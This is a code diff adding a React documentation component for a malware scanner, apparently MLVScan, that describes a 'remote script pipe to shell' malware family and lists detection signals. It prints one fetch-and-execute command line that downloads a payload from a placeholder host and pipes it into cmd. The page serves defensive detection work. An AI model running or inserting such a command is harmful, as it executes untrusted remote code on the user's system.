@@ -1,0 +1,35 @@
+export default function RemoteScriptPipeShellFamilyContent() {
+  return (
+    <>
+      <h2>Behavior Pattern</h2>
+      <p>
+        This family launches a command shell that retrieves a remote script with a command-line web
+        client and pipes the response directly into another shell interpreter. The payload does not
+        need to be written as a visible file before execution.
+      </p>
+
+      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto mb-6">
+        <code>{String.raw`cmd.exe /c curl https://example/payload | cmd`}</code>
+      </pre>
+
+      <h2>Why It Clusters Cleanly</h2>
+      <ul>
+        <li>Remote script retrieval and shell execution occur in the same command line</li>
+        <li>The pipe operator removes the need for a staged payload filename</li>
+        <li>Changing the remote URL still leaves the shell-pipe behavior intact</li>
+      </ul>
+
+      <h2>Observed Variants</h2>
+      <p>
+        Current quarantine coverage clusters the behavior observed in <code>TwelvePlayerExpansion.dll</code>.
+      </p>
+
+      <h2>Key Signals In MLVScan</h2>
+      <ul>
+        <li><code>ProcessStartRule</code> on <code>cmd.exe</code> launch</li>
+        <li>Command-line web client markers such as <code>curl</code> or <code>Invoke-WebRequest</code></li>
+        <li>Pipe-to-shell execution markers</li>
+      </ul>
+    </>
+  )
+}
